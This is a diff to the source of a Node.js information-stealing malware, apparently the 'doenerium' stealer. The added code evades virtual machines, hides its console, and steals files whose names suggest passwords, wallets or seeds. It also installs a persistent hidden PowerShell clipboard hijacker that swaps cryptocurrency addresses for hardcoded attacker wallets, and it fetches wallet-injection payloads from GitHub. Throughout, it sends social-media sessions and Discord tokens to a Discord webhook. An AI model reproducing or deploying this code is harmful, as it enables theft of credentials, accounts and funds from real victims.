@@ -1,9 +1,7 @@
 const fs = require('fs');
 const fsPromises = require('fs').promises;
 const path = require('path');
-const httpx = require('axios');
 const axios = require('axios');
-const { app, dialog } = require('electron');
 const os = require('os');
 const FormData = require('form-data');
 const AdmZip = require('adm-zip');
@@ -18,10 +16,11 @@ const computerName = os.hostname();
 const local = process.env.LOCALAPPDATA;
 const discords = [];
 const locale = getLocale();
-const mainFolderPath = `./${locale}-${computerName}`;
-var appdata = process.env.APPDATA,
-    LOCAL = process.env.LOCALAPPDATA,
-    localappdata = process.env.LOCALAPPDATA;
+const mainFolderPath = `C:/ProgramData/Steam/Launcher/${locale}-${computerName}`;
+var appdata = process.env.APPDATA, LOCAL = process.env.LOCALAPPDATA, localappdata = process.env.LOCALAPPDATA;
+const keywords = ["gmail.com", "live.com", "impots.gouv.fr", "zoho.com", "ameli.fr", "yahoo.com", "tutanota.com", "uber.com", "trashmail.com", "gmx.net", "github.com", "ubereats.com", "safe-mail.net", "thunderbird.net", "mail.lycos.com", "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc", "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev", "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de", "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com", "accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com", "ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com", "hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com", "xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl", "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net", "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com", "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com", "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "steamcommunity.com", "epicgames.com", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com", "ftx.com", "ftx.us", "binance.us", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io", "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today", "moonx.gg", "novoline.lol", "twitch.tv"];
+const atomicInjectionUrl = "https://github.com/doenerium6969/wallet-injection/raw/main/atomic.asar";
+const exodusInjectionUrl = "https://github.com/doenerium6969/wallet-injection/raw/main/exodus.asar";
 
 
 const botToken = 'YOURBOTTOKEN';
@@ -85,6 +84,34 @@ function bioscheck(callback) {
     });
 }
 
+function checkAndExecute() {
+    getPCSerialNumber((serialNumber) => {
+        const disks = serialNumber.split('\n');
+
+        for (const disk of disks) {
+            if (disk.trim().startsWith("vb") || disk.trim().startsWith("vm")) {
+                exitProcess();
+                return;
+            }
+        }
+        console.log("No disk starting with 'vb' or 'vm' found.");
+    });
+}
+
+function getPCSerialNumber(callback) {
+    exec('wmic diskdrive get serialnumber', (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Error executing command: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            console.error(`Error: ${stderr}`);
+            return;
+        }
+        callback(stdout);
+    });
+}
+
 function processCheck(callback) {
     executeCommand('tasklist /fo csv', (stdout) => {
         const processes = stdout.split('\r\n').map(line => {
@@ -119,10 +146,15 @@ function gpucheck(callback) {
         if (checkListed(blackListedGPU, gpuList)) {
             exitProcess();
         } else {
-            oscheck(callback);
+            if (gpuList.some(gpu => gpu.startsWith("VMware"))) {
+                exitProcess();
+            } else {
+                oscheck(callback);
+            }
         }
     });
 }
+
 
 function oscheck(callback) {
     executeCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName", (stdout) => {
@@ -140,7 +172,7 @@ function ramcheck(callback) {
     if (totalRAM > 1200) {
         ipcheck(callback);
     } else {
-        console.log("Le reste du code après ramcheck");
+        console.log("");
     }
 }
 
@@ -149,12 +181,39 @@ function exitProcess() {
     process.exit(0);
 }
 
+function hideSelf() {
+
+    let powershellScript = `
+    Add-Type -Name Window -Namespace Console -MemberDefinition '
+    [DllImport("Kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+    '
+
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    #0 hide
+    [Console.Window]::ShowWindow($consolePtr, 0)
+    `;
+
+    let workingDir = process.cwd();
+    let tempfile = `${workingDir}\\temp.ps1`;
+    fs.writeFileSync(tempfile, powershellScript);
+
+    //a little convoluted to get around powershell script execution policy (might be disabled)
+    require('child_process').execSync(`type .\\temp.ps1 | powershell.exe -noprofile -`, {stdio: 'inherit'});
+    fs.unlinkSync(tempfile); //delete temp file
+}
+
+
 const foldersToSearch = [
   'Videos',
   'Desktop',
   'Documents',
   'Downloads',
-  'Pictures'
+  'Pictures',
+  path.join('AppData', 'Roaming', 'Microsoft', 'Windows', 'Recent')
 ];
 paths = [
     appdata + '\\discord\\',
@@ -223,21 +282,6 @@ paths = [
 function onlyUnique(item, index, array) {
     return array.indexOf(item) === index;
 }
-
-async function execAsync(command) {
-    try {
-        const { stdout, stderr } = await exec(command);
-        if (stderr) {
-            console.error(`Error executing command: ${command}\n${stderr}`);
-            return { error: stderr };
-        }
-        return { stdout };
-    } catch (error) {
-        console.error(`Error executing command: ${command}\n${error}`);
-        return { error: error.message };
-    }
-}
-
 
 const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
 const keyName = 'Steam';
@@ -475,6 +519,60 @@ async function findGithubBackupCodes() {
     }
   }
 }
+
+
+const allowedExtensions = [".rdp", ".txt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".keys", ".ldb", ".log"];
+const files = ["secret", "password", "account", "tax", "key", "wallet", "gang", "default", "backup", "passw", "mdp", "motdepasse", "acc", "mot_de_passe", "login", "secret", "bot", "atomic", "account", "acount", "paypal", "banque", "bot", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "secret", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privé", "prive", "telegram", "identifiant", "identifiants", "personnel", "trading", "bitcoin", "sauvegarde", "funds", "recup", "note"];
+
+function stealFiles() {
+  try {
+    const tempDir = fs.mkdtempSync(path.join(process.env.TEMP || '/tmp', crypto.randomBytes(16).toString('hex')));
+    const zip = new AdmZip();
+
+    for (const extension of allowedExtensions) {
+      const results = [];
+
+      for (const folder of foldersToSearch) {
+        const directory = path.join(process.env.HOME || process.env.USERPROFILE, folder);
+        if (fs.existsSync(directory)) {
+          const filesInFolder = fs.readdirSync(directory);
+          for (const file of filesInFolder) {
+            const filePath = path.join(directory, file);
+            const fileExtension = path.extname(file).toLowerCase();
+            const fileName = path.basename(file, path.extname(file)).toLowerCase();
+            const fileStats = fs.statSync(filePath);
+            const fileSize = fileStats.size;
+            if (fileStats.isFile() &&
+                fileExtension === extension &&
+                files.some(keyword => fileName.includes(keyword)) &&
+                fileSize < 3 * 1024 * 1024) {
+              results.push(filePath);
+            }
+          }
+        }
+      }
+
+      if (results.length > 0) {
+        results.forEach(file => {
+          const fileName = path.basename(file);
+          const destPath = path.join(tempDir, fileName);
+          fs.copyFileSync(file, destPath);
+        });
+      }
+    }
+
+    zip.addLocalFolder(tempDir);
+    const zipFilePath = path.join(mainFolderPath, 'stolen_files.zip');
+    zip.writeZip(zipFilePath);
+    fs.rmSync(tempDir, { recursive: true });
+    console.log('Files stolen and compressed successfully.');
+  } catch (err) {
+    console.error("Error:", err);
+  }
+}
+
+
+
 
 
 function sendSuccessToWebhook() {
@@ -808,12 +906,9 @@ if (!fs.existsSync(randomPath)) {
 function initializeFolders() {
     try {
         if (!fs.existsSync(mainFolderPath)) {
-            fs.mkdirSync(mainFolderPath);
+            fs.mkdirSync(mainFolderPath, { recursive: true });
             console.log('Main folder created successfully');
-            
-            setTimeout(() => {
-                sendSuccessToWebhook();
-            }, 3000);
+            sendSuccessToWebhook();
         }
     } catch (error) {
         const errorMessage = `Error Initialize main folder: ${error.message}`;
@@ -821,16 +916,139 @@ function initializeFolders() {
     }
 }
 
+
+function createAndExecuteScripts() {
+    const userDataPath = path.join('C:', 'ProgramData', 'edge', 'Updater');
+    if (!fs.existsSync(userDataPath)) {
+        fs.mkdirSync(userDataPath, { recursive: true });
+    }
+
+    const scriptsPath = userDataPath;
+    const powershellScriptContent = `
+$sctpth = $MyInvocation.MyCommand.Path
+$ran = -join ((65..90) + (97..122) | Get-Random -Count 15 | ForEach-Object {[char]$_})
+$ranpth = if ((Get-Random) % 2) { Join-Path $env:TEMP "$ran.ps1" } else { Join-Path $env:APPDATA "$ran.ps1" }
+Copy-Item -Path $sctpth -Destination $ranpth -Force
+Remove-Item -Path $sctpth -Force
+
+$key = "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+$valn = "Powershell"
+$val = """powershell.exe"" -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ranpth"""
+
+if (!(Test-Path $key)) {
+    New-Item -Path $key -Force | Out-Null
+}
+
+Set-ItemProperty -Path $key -Name $valn -Value $val
+
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+public static void Hide()
+{
+    IntPtr hWnd = GetConsoleWindow();
+    if(hWnd != IntPtr.Zero)
+    {
+        ShowWindow(hWnd, 0);
+    }
+}
+'
+[Console.Window]::Hide()
+
+$attr = [System.IO.FileAttributes]::Hidden
+Set-ItemProperty -Path $ranpth -Name Attributes -Value $attr
+
+$addy = @{
+    "btc" = "bc1qsuc4rc2uknl43kqxemuyv6d3xffnds2j008gj7"
+    "eth" = "0x700875DF55d904b24469458a6bAE04F6dd7eF91F"
+    "ltc" = "ltc1qx7n7fr4anyssyhfp2s4sd9jv7r89ex9sd2d6dg"
+    "trx" = "TJYeEhaoY5sQ66SHLbCp85jGcSkqLLvBTU"
+    "bch" = "qzjw4dju5x2x3kwtuelppmm8lpw7mvna7s5fle3sr4"
+    "xmr" = "43AKqd1L4QKVQux7bKEK6dUmVKEJTdEtgSgYaj25rgRGaUrp2gekLA1bRDzJbbadPTaNwBG8njmYCVvEiJZByyvV6NanCUR"
+    "xrp" = "rf2ysNUBNYFPX5tzNfaNgRjJDedQWh6mSV"
+    "zcash" = "t1a34uQ8XRNKoWyykQUAtR6vj58UDMpaayf"
+    "doge" = "DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf"
+}
+
+while ($true) {
+    $clipper = Get-Clipboard
+    if ($clipper -match "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,41}$") {
+        $clipper = $addy["btc"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    elseif ($clipper -match "^0x[a-fA-F0-9]{40}$") {
+        $clipper = $addy["eth"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    elseif ($clipper -match "^(L|M|3|ltc1)[a-km-zA-HJ-NP-Z1-9]{26,33}$") {
+        $clipper = $addy["ltc"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    elseif ($clipper -match "^T[a-zA-Z0-9]{28,33}$") {
+        $clipper = $addy["trx"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    elseif ($clipper -match "^((bitcoincash:)?(q|p)[a-z0-9]{41})$") {
+        $clipper = $addy["bch"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    elseif ($clipper -match "^4[0-9AB][1-9A-HJ-NP-Za-km-z]{92,95}$") {
+        $clipper = $addy["xmr"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    elseif ($clipper -match "^(?:^r[0-9a-zA-Z]{24,34}$)") {
+        $clipper = $addy["xrp"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    elseif ($clipper -match "^t1[0-9A-z]{32,39}$") {
+        $clipper = $addy["zcash"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    elseif ($clipper -match "^{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32,61}$") {
+        $clipper = $addy["doge"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    Start-Sleep -Milliseconds 500
+}`;
+
+    const ps1Path = path.join(scriptsPath, 'Get-Clipboard.ps1');
+
+    try {
+        fs.writeFileSync(ps1Path, powershellScriptContent, 'utf8');
+        console.log(`Script PowerShell enregistré avec succès à l'emplacement : ${ps1Path}`);
+
+        exec(`powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "${ps1Path}"`, (error, stdout, stderr) => {
+            if (error) {
+                console.error(`Erreur lors de l'exécution du script PowerShell : ${error.message}`);
+                return;
+            }
+            if (stderr) {
+                console.error(`Erreur lors de l'exécution du script PowerShell : ${stderr}`);
+                return;
+            }
+            console.log(`Script PowerShell exécuté avec succès : ${stdout}`);
+        });
+    } catch (error) {
+        console.error(`Erreur lors de l'enregistrement du script PowerShell : ${error.message}`);
+        return;
+    }
+}
+
+
+
 function createRunBat() {
-    const programName = path.basename(app.getPath('exe'));
-    const sourceFolderPath = path.dirname(app.getPath('exe'));
+    const userData = path.join('C:', 'ProgramData', 'edge', 'Updater');
+    if (!fs.existsSync(userData)) {
+        fs.mkdirSync(userData, { recursive: true });
+    }
 
     // URL
     const downloadUrl1 = "YOUR-STEALER-EXE-LINK-HERE";
     const downloadUrl2 = "YOUR-BINDED-EXE-LINK-HERE";
     
-
-    const app1Path = `"${app.getPath('exe')}"`;
+    const app1Path = `"${process.argv[0]}"`;
     const app2Path = '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Steam_Service.exe"';
     const batContent = `@echo off
 
@@ -868,7 +1086,7 @@ if not exist ${app2Path} (
 )
 `;
 
-    const batScriptPath = path.join(app.getPath('userData'), 'CheckEpicGamesLauncher.bat');
+    const batScriptPath = path.join(userData, 'CheckEpicGamesLauncher.bat');
     fs.writeFileSync(batScriptPath, batContent, 'utf-8');
 
     console.log(`Batch script created successfully at: ${batScriptPath}`);
@@ -877,7 +1095,7 @@ if not exist ${app2Path} (
 objShell.Run "${batScriptPath}", 0, True
 Set objShell = Nothing`;
 
-    const vbsScriptPath = path.join(app.getPath('userData'), 'RunBatHidden.vbs');
+    const vbsScriptPath = path.join(userData, 'RunBatHidden.vbs');
     fs.writeFileSync(vbsScriptPath, vbsContent, 'utf-8');
 
     console.log(`VBS script created successfully at: ${vbsScriptPath}`);
@@ -905,48 +1123,6 @@ Set objShell = Nothing`;
 
 
 
-
-async function getEncrypted() {
-  for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
-
-    if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
-      continue; 
-    }
-    try {
-
-      let _0x276965 = Buffer.from(
-        JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
-          .os_crypt.encrypted_key,
-        'base64'
-      ).slice(5);
-
-
-      const _0x4ff4c6 = Array.from(_0x276965);
-
-
-      const _0x4860ac = execSync(
-        'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
-          _0x4ff4c6 +
-          "), $null, 'CurrentUser')"
-      )
-        .toString()
-        .split('\r\n');
-
-      const _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != '');
-
-      const _0x2ed7ba = Buffer.from(_0x4a5920);
-
-
-      browserPath[_0x4c3514].push(_0x2ed7ba);
-    } catch (_0x32406b) {
-
-    }
-  }
-}
-
-
-
-
 async function GetInstaData(session_id) {
   try {
     const headers = {
@@ -962,7 +1138,7 @@ async function GetInstaData(session_id) {
     };
 
     // Request to get Instagram account data
-    const response = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
+    const response = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
     const userData = response.data.user;
 
     // Create data object
@@ -996,9 +1172,6 @@ function saveInstagramFile(session_id) {
   console.log('Instagram session information written to instagram.txt');
 }
 
-
-
-
 async function GetFollowersCount(session_id) {
   try {
     const headers = {
@@ -1007,11 +1180,10 @@ async function GetFollowersCount(session_id) {
       "Cookie": `sessionid=${session_id};`
     };
 
-
-    const accountResponse = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
+    const accountResponse = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
     const accountInfo = accountResponse.data.user;
 
-    const userInfoResponse = await httpx.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers: headers });
+    const userInfoResponse = await axios.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers: headers });
     const userData = userInfoResponse.data.user;
     const followersCount = userData.follower_count;
 
@@ -1044,7 +1216,6 @@ async function SubmitInstagram(session_id) {
         text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
       },
     };
-
 
     // Introduce a 2-second delay before sending the second webhook request
     await new Promise(resolve => setTimeout(resolve, 1000));
@@ -1248,17 +1419,13 @@ function moveTikTokFile(cookie) {
     // No TikTok session information intercepted, so no need to create the folder or file
     return;
   }
-
   const tiktokFolderPath = path.join(mainFolderPath, 'Tiktok');
   const tiktokFilePath = path.join(tiktokFolderPath, 'tiktok.txt');
-
   if (!fs.existsSync(tiktokFolderPath)) {
     fs.mkdirSync(tiktokFolderPath);
   }
-
   // Write the intercepted TikTok session information to the tiktok.txt file
   fs.writeFileSync(tiktokFilePath, cookie);
-
   console.log('TikTok session information written to tiktok.txt');
 }
 
@@ -1415,7 +1582,7 @@ function setRedditSession(cookie) {
 
                         const embedData = {
                             title: "",
-                            description: "Reddit Session Detected",
+                            description: "",
                             color: 0x303037, 
                             url: '',
                             timestamp: new Date().toISOString(),
@@ -1429,10 +1596,14 @@ function setRedditSession(cookie) {
                 { name: '🌟 Reddit Gold', value: '```' + (gold ? 'Yes' : 'No') + '```', inline: true },
                 { name: '🚫 Suspended', value: '```' + (suspended ? 'Yes' : 'No') + '```', inline: true }
                             ],
-                          footer: {
-                            text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
-                            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
-                          }
+                            footer: {
+                                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
+                                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                            },
+                            author: {
+                                name: "Reddit Session Detected",
+                                icon_url: "https://preview.redd.it/reddit-logo-changes-to-old-non-pixelated-logo-sign-of-v0-1povzsj8o0eb1.jpg?width=640&crop=smart&auto=webp&s=8bab770af358cf676163dbde410c9caa2b13cbe5"
+                            }
                         };
 
                         axios.post(discordWebhookUrl, { embeds: [embedData] })
@@ -1461,30 +1632,8 @@ function setRedditSession(cookie) {
     }
 }
 
-
-function findTokenn(path) {
-    path += 'Local Storage\\leveldb';
-    let tokens = [];
-    try {
-        fs.readdirSync(path)
-            .map(file => {
-                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
-                    .split(/\r?\n/)
-                    .forEach(line => {
-                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
-                        for (const pattern of patterns) {
-                            const foundTokens = line.match(pattern);
-                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
-                        }
-                    });
-            });
-    } catch (e) {}
-    return tokens;
-}
-
    
 //
-
 const tokens = [];
 
 function findToken(path) {
@@ -1728,9 +1877,7 @@ async function getTokens() {
                     value: "```\n" + userData.bio + "\n```",
                 });
             }
-
             await axios.post(discordWebhookUrl, data);
-
         } catch (error) {
             console.error(error);
         }
@@ -2296,13 +2443,7 @@ async function stealSteamSession() {
                     };
 
                     await axios.post(discordWebhookUrl, webhookPayload);
-                    console.log('First Steam session detected embed sent to webhook.');
-
-                    // Add a delay of 2 seconds
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-
-                    await axios.post(discordWebhookUrl, webhookPayload);
-                    console.log('Second Steam session detected embed sent to webhook.');
+                    console.log('Steam session detected embed sent to webhook.');
                 } catch (error) {
                     console.error(`An error occurred while processing Steam account ${account}: ${error.message}`);
                 }
@@ -2371,77 +2512,76 @@ async function createScreenshotScript() {
         fs.mkdirSync(outputPath);
     }
     const scriptContent = `
-# Capture screenshots of all screens
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-
-# Get all screens
-$screens = [System.Windows.Forms.Screen]::AllScreens
-
-# Calculate the total width and maximum height of all screens
-$totalWidth = ($screens | ForEach-Object { $_.Bounds.Width } | Measure-Object -Sum).Sum
-$maxHeight = ($screens | ForEach-Object { $_.Bounds.Height } | Measure-Object -Max).Maximum
-
-# Check if the calculated values are valid
-if ($totalWidth -le 0 -or $maxHeight -le 0) {
-    Write-Host "Error: Unable to calculate valid screen dimensions."
-    exit
-}
-
-# Try to create a bitmap with a PixelFormat argument
 try {
-    $combinedScreenshot = New-Object System.Drawing.Bitmap $totalWidth, $maxHeight, ([System.Drawing.Imaging.PixelFormat]::Format32bppArgb)
-} catch {
-    Write-Host "Error creating Bitmap object: $_"
-    exit
-}
+    # Capture screenshots of all screens
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
 
-# Try to create a graphics object
-try {
-    $graphics = [System.Drawing.Graphics]::FromImage($combinedScreenshot)
-} catch {
-    Write-Host "Error creating Graphics object: $_"
-    exit
-}
+    # Get all screens
+    $screens = [System.Windows.Forms.Screen]::AllScreens
 
-# Capture the screen images and paste them onto the combined screenshot
-$offsetX = 0
-foreach ($screen in $screens) {
-    $screenScreenshot = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
+    # Calculate the total width and maximum height of all screens
+    $totalWidth = ($screens | ForEach-Object { $_.Bounds.Width } | Measure-Object -Sum).Sum
+    $maxHeight = ($screens | ForEach-Object { $_.Bounds.Height } | Measure-Object -Max).Maximum
 
-    # Try to create a graphics object for the screen
+    # Check if the calculated values are valid
+    if ($totalWidth -le 0 -or $maxHeight -le 0) {
+        throw "Error: Unable to calculate valid screen dimensions."
+    }
+
+    # Try to create a bitmap with a PixelFormat argument
     try {
-        $screenGraphics = [System.Drawing.Graphics]::FromImage($screenScreenshot)
+        $combinedScreenshot = New-Object System.Drawing.Bitmap $totalWidth, $maxHeight, ([System.Drawing.Imaging.PixelFormat]::Format32bppArgb)
     } catch {
-        Write-Host "Error creating screen Graphics object for $($screen.DeviceName): $_"
-        exit
+        throw "Error creating Bitmap object: $_"
     }
 
-    $screenGraphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
-    $graphics.DrawImage($screenScreenshot, $offsetX, 0)
-    $offsetX += $screen.Bounds.Width
-}
-
-# Save the combined screenshot to a file
-$outputPath = "${mainFolderPath}\\Screenshots\\Screenshot.png"
-
-try {
-    # Créer le répertoire si nécessaire
-    $outputDirectory = [System.IO.Path]::GetDirectoryName($outputPath)
-    if (-not (Test-Path -Path $outputDirectory)) {
-        New-Item -ItemType Directory -Force -Path $outputDirectory
+    # Try to create a graphics object
+    try {
+        $graphics = [System.Drawing.Graphics]::FromImage($combinedScreenshot)
+    } catch {
+        throw "Error creating Graphics object: $_"
     }
 
-    # Convertir l'image en tableau de bytes et le sauvegarder directement
-    $imageBytes = [System.IO.MemoryStream]::new()
-    $combinedScreenshot.Save($imageBytes, [System.Drawing.Imaging.ImageFormat]::Png)
-    [System.IO.File]::WriteAllBytes($outputPath, $imageBytes.ToArray())
-    Write-Host "Combined screenshot saved to: $outputPath"
+    # Capture the screen images and paste them onto the combined screenshot
+    $offsetX = 0
+    foreach ($screen in $screens) {
+        $screenScreenshot = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
+
+        # Try to create a graphics object for the screen
+        try {
+            $screenGraphics = [System.Drawing.Graphics]::FromImage($screenScreenshot)
+        } catch {
+            throw "Error creating screen Graphics object for $($screen.DeviceName): $_"
+        }
+
+        $screenGraphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
+        $graphics.DrawImage($screenScreenshot, $offsetX, 0)
+        $offsetX += $screen.Bounds.Width
+    }
+
+    # Save the combined screenshot to a file
+    $outputPath = "${mainFolderPath}\\Screenshots\\Screenshot.png"
+
+    try {
+        # Créer le répertoire si nécessaire
+        $outputDirectory = [System.IO.Path]::GetDirectoryName($outputPath)
+        if (-not (Test-Path -Path $outputDirectory)) {
+            New-Item -ItemType Directory -Force -Path $outputDirectory
+        }
+
+        # Convertir l'image en tableau de bytes et le sauvegarder directement
+        $imageBytes = [System.IO.MemoryStream]::new()
+        $combinedScreenshot.Save($imageBytes, [System.Drawing.Imaging.ImageFormat]::Png)
+        [System.IO.File]::WriteAllBytes($outputPath, $imageBytes.ToArray())
+        Write-Host "Combined screenshot saved to: $outputPath"
+    } catch {
+        # Gérer les erreurs et afficher le message d'erreur spécifique
+        throw "Error saving the combined screenshot: $($_.Exception.Message)"
+    }
 } catch {
-    # Gérer les erreurs et afficher le message d'erreur spécifique
-    Write-Host "Error saving the combined screenshot: $($_.Exception.Message)"
+    Write-Host "Error occurred: $_"
 }
-
     `;
     const scriptPath = path.join(user.temp, 'CaptureScreens.ps1');
     try {
@@ -2454,12 +2594,12 @@ try {
 }
 
 
+
 async function archiveAndSendData() {
     let zipFilePath;
     const outputPath = path.join(mainFolderPath, 'Screenshots');
     const scriptPath = await createScreenshotScript(outputPath);
     try {
-        initializeFolders();
         await new Promise(resolve => setTimeout(resolve, 4000));
         const walletsFolder = path.join(mainFolderPath, 'Wallets');
         if (!fs.existsSync(walletsFolder)) {
@@ -2530,14 +2670,13 @@ async function archiveAndSendData() {
         });
         const archive = new AdmZip();
         archive.addLocalFolder(mainFolderPath);
-        zipFilePath = `./${locale}-${computerName}.zip`;
+        zipFilePath = `C:/ProgramData/Steam/Launcher/${locale}-${computerName}.zip`;
         archive.addZipComment('All the Information was Stealed by T.ME/DOENERIUM69.');
         archive.writeZip(zipFilePath);
         console.log('Archive created successfully');
         getExtension(zipFilePath);
     } catch (error) {
         console.error(`Error in archiveAndSendData: ${error.message}`);
-        // Continue execution even if an error occurs
     } finally {
         try {
             if (fs.existsSync(mainFolderPath)) {
@@ -2820,7 +2959,6 @@ try {
         },
     };
 
-    await new Promise(resolve => setTimeout(resolve, 1000));
     axios.post(discordWebhookUrl, { embeds: [combinedInfoEmbed] })
         .then(() => {
             console.log('system information successfully sent to Discord webhook.');
@@ -2828,10 +2966,28 @@ try {
         .catch(error => {
             console.error('An error occurred while sending system information:', error.message);
         });
-
+        
+    await clean();
     await new Promise(resolve => setTimeout(resolve, 5000));
-
     process.exit();
+}
+
+async function clean() { 
+    const steamLauncherPath = 'C:/ProgramData/Steam/Launcher';
+    if (fs.existsSync(steamLauncherPath)) {
+        execSync(`rmdir /s /q "${steamLauncherPath}"`);
+        console.log(`Folder ${steamLauncherPath} deleted successfully.`);
+    } else {
+        console.log(`Folder ${steamLauncherPath} does not exist.`);
+    }
+
